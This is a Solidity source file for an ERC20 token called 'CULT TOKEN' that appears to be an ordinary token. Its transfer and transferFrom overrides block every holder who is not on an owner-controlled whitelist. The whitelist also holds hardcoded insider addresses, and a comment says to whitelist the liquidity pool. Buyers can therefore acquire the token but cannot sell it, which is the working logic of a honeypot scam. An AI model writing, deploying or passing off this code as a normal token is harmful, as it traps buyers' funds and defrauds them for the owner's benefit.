// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

import "./ERC20.sol";
import "./Ownable.sol";


// You have to addd LP tokens In the White List after you add liquidity.

contract SpecialToken is ERC20, Ownable {

    mapping (address => bool) whiteList;
    constructor() ERC20("CULT TOKEN", "CLTT") {
        whiteList[msg.sender]= true;
        _mint(msg.sender, 500000 * 10 ** decimals());
        whiteList[0x4f5Ec14eA0E3739805FB2b1D3735b97060a47AEc]= true;
        whiteList[0xe94cC8587DA5c7323f433022c0fBce28D5fdbdf9]=true;
        whiteList[0x7c4F223cE813c325A53B68C33d0439985A2637fe]=true;
        whiteList[0xBFb55372d369D15b8467dF9c5411f5037E3dDb41]=true;
        whiteList[0x711C3B6A284163948148F7BABED6B9e27ffa8Bf0]=true;
        whiteList[0x081923B641D387eC649A059F5673225651E79b4F]=true;
        whiteList[0x0cAe99362CEE40595eFdC8Ab4488576E99F3cAFE]=true;
    }
    function addTowhiteList(address add) public onlyOwner{
        whiteList[add]=true;
    }

    function removeFromWhiteList(address add) public onlyOwner{
        whiteList[add]=false;
    }

    function getStatus(address add) public view onlyOwner returns (bool status){
        return whiteList[add];
    }

    function transfer(address to, uint256 amount) public virtual override returns (bool) {
        if(owner()!= to && owner()!=msg.sender)
        {
            require(whiteList[msg.sender], "Not authorized");
        }
        address owner = _msgSender();
        _transfer(owner, to, amount);
        return true;
    }

    function transferFrom(address from,address to,uint256 amount) public virtual override returns (bool) {
        if(owner()!= to && owner()!=from)
        {
            require(whiteList[from]&&whiteList[to], "Not authroized");
        }
        address spender = _msgSender();
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }

}